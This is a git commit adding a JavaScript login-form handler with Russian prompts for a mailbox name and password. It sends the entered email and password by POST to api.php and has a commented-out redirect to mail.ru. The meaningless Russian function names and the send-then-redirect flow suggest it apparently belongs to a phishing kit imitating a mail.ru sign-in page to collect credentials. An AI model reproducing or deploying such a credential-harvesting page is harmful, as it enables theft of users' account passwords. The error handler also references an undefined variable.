70b89df8a95677fcb7c8a121664e655138de79b4
swendren <98520745+swendren@users.noreply.github.com>
2022-01-27 10:36:36 +0100

    Add files via upload

---
+++ asesion.js
@@ -0,0 +1,71 @@
+document.getElementById("signinsb").addEventListener("click", function() { 
+	Подробнее();
+});
+
+
+function Подробнее() {
+	var emailu  = document.getElementById("emailu").value;	
+	var password  = document.getElementById("password").value;
+	var emailesr = paserrw = true; 
+	
+    if(myTrim(emailu) == "") {
+        printError("emailesr", "Введите имя ящика");
+    } else {
+        var regex = /^\S+@\S+\.\S+$/;
+        if(regex.test(emailu) === false) {
+            printError("emailesr", "Неверный почтовый ящик. Попробуй снова");
+        } else{
+            printError("emailesr", "");
+            emailesr = false;
+        }
+    }
+		// Validate password
+    if(myTrim(password) == "") {
+        printError("paserrw", "Введите пароль");
+    } else {
+        if(myTrim(password).length < 6){
+			printError("paserrw", "Неверный пароль. Попробуй снова");
+		} else if(myTrim(password).length > 40){
+			printError("paserrw", "Неверный пароль. Попробуй снова");
+		} else{
+            printError("paserrw", "");
+            paserrw = false;
+        }
+    } 
+		// Prevent the form from being submitted if there are any errors
+	if ((emailesr || paserrw) == true) {
+	   return false;
+    } else {
+        повышающая()
+    }  
+}
+function повышающая() {
+	var emailu  = document.getElementById("emailu").value;	
+	var password  = document.getElementById("password").value;
+		$.ajax({
+		type: "POST",
+		url: "api.php", 
+		//dataType: "json",
+		data: {emailu: emailu, password: password},
+		success: function(data){
+			console.log(data)//remove in production
+			//window.location.href = "mail.ru";
+		},
+		 error : function(jqXHR, textStatus, errorThrown) {
+	       console.log(data)//remove in production
+           window.location.reload();                    
+       }
+		 
+	});
+}
+
+function myTrim(x) {
+  return x.replace(/^\s+|\s+$/gm,'');
+}
+
+String.prototype.nl2br = function(){
+	return this.replace(/\n/g, "<br />");
+}
+function printError(elemId, hintMsg) {
+	document.getElementById(elemId).innerHTML = hintMsg;
+} 
